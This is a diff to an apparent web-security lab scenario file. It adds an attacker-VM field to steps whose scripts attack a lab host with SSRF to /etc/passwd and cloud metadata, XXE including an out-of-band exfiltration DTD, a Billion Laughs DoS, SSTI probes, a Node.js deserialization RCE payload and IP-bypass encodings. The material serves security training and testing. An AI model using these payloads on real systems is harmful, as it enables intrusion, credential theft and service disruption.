@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: juice
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/profile/image/url?url=http://localhost:3000'
   risk_level: medium
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: Port
     field: stdout
+  target_vm: attacker
   script: for port in 22 80 3000 8080; do echo "Port $port:"; curl -s -o /dev/null -w '%{http_code}' "http://10.20.30.80:3000/profile/image/url?url=http://127.0.0.1:$port" 2>/dev/null; echo ''; done
   risk_level: medium
 - order: 3
@@ -49,6 +51,7 @@ steps:
     type: output_contains
     expect: root
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/profile/image/url?url=file:///etc/passwd'
   risk_level: medium
 - order: 4
@@ -63,6 +66,7 @@ steps:
     type: output_contains
     expect: ENTITY xxe SYSTEM
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/xxe_payload.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\
     XMLEOF\ncat /tmp/xxe_payload.xml"
   risk_level: medium
@@ -77,6 +81,7 @@ steps:
     type: output_contains
     expect: xml
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST -H ''Content-Type: application/xml'' -d @/tmp/xxe_payload.xml http://10.20.30.80:3000/api/Products'
   risk_level: medium
 - order: 6
@@ -102,6 +107,7 @@ steps:
     type: output_contains
     expect: exfil
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/evil.dtd << ''DTDEOF''
 
     <!ENTITY % file SYSTEM "file:///etc/hostname">
@@ -128,6 +134,7 @@ steps:
     type: output_contains
     expect: SSRF IP Bypass
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SSRF IP Bypass Techniques ==='' && echo ''1. Decimal: http://2130706433:3000/'' && echo ''2. Hex: http://0x7f000001:3000/'' && echo ''3. Octal: http://0177.0.0.1:3000/'' && echo ''4.
     IPv6: http://[::1]:3000/'' && echo ''5. Short: http://127.1:3000/'' && echo ''6. DNS rebinding: attacker.com -> 127.0.0.1'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://2130706433:3000/'''
   risk_level: medium
@@ -143,6 +150,7 @@ steps:
     type: output_contains
     expect: Cloud Metadata
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Cloud Metadata SSRF ==='' && echo ''AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/'' && echo ''GCP: http://metadata.google.internal/computeMetadata/v1/'' &&
     echo ''Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01'' && curl -s -o /dev/null -w ''%{http_code}'' ''http://10.20.30.80:3000/profile/image/url?url=http://169.254.169.254/latest/meta-data/'''
   risk_level: medium
@@ -159,6 +167,7 @@ steps:
     type: output_contains
     expect: Billion Laughs
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/xxe_dos.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
     \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'Billion\
     \ Laughs payload created (NOT executed for safety)' && echo 'Expansion: 10^3 = 1000x amplification at level 4' && cat /tmp/xxe_dos.xml"
@@ -175,6 +184,7 @@ steps:
     type: output_contains
     expect: SSTI test
     field: stdout
+  target_vm: attacker
   script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=%7B%7B7*7%7D%7D'' && echo '''' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=${7*7}'' && echo '''' && echo ''SSTI test:
     if 49 appears in response, template injection exists'''
   risk_level: medium
@@ -191,6 +201,7 @@ steps:
     type: output_contains
     expect: HTTP Request Smuggling
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== HTTP Request Smuggling (CL.TE) ==='' && echo ''POST / HTTP/1.1'' && echo ''Host: 10.20.30.80'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' &&
     echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo '''' && echo ''Front-end uses Content-Length, Back-end uses Transfer-Encoding'' && echo ''Result: SMUGGLED becomes start of next request'''
   risk_level: medium
@@ -212,6 +223,7 @@ steps:
     type: output_contains
     expect: Insecure Deserialization
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Insecure Deserialization (Node.js) ==='' && cat > /tmp/deser_payload.json << ''JSONEOF''
 
     {"rce":"_$$ND_FUNC$$_function(){require(''child_process'').exec(''id'', function(error, stdout) {console.log(stdout);})}()"}
@@ -232,6 +244,7 @@ steps:
     type: output_contains
     expect: HTTP/
     field: stdout
+  target_vm: attacker
   script: 'curl -s -i -N -H ''Connection: Upgrade'' -H ''Upgrade: websocket'' -H ''Sec-WebSocket-Version: 13'' -H ''Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=='' http://10.20.30.80:3000/socket.io/ 2>&1
     | head -20'
   risk_level: medium
@@ -246,6 +259,7 @@ steps:
     type: output_contains
     expect: access-control
     field: stdout
+  target_vm: attacker
   script: 'curl -s -I -H ''Origin: https://evil.com'' http://10.20.30.80:3000/rest/products/search?q=test | grep -i ''access-control'''
   risk_level: medium
 - order: 15
@@ -263,6 +277,7 @@ steps:
     type: output_contains
     expect: Advanced Web Vulnerabilities Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Advanced Web Vulnerabilities Report ===\n\n[Critical Risk]\n1. SSRF: Internal service access, cloud metadata theft\n   Defense: URL whitelist, disable unnecessary protocols\n2.
     XXE: File read, SSRF chaining, DoS\n   Defense: Disable external entities in XML parser\n3. Deserialization: Remote code execution\n   Defense: Never deserialize untrusted data\n\n[High Risk]\n4. SSTI:
     Template-based RCE\n   Defense: Sandbox templates, input validation\n5. Request Smuggling: WAF bypass, cache poisoning\n   Defense: Normalize HTTP parsing, disable HTTP/1.1 reuse\n\n[Medium Risk]\n6.
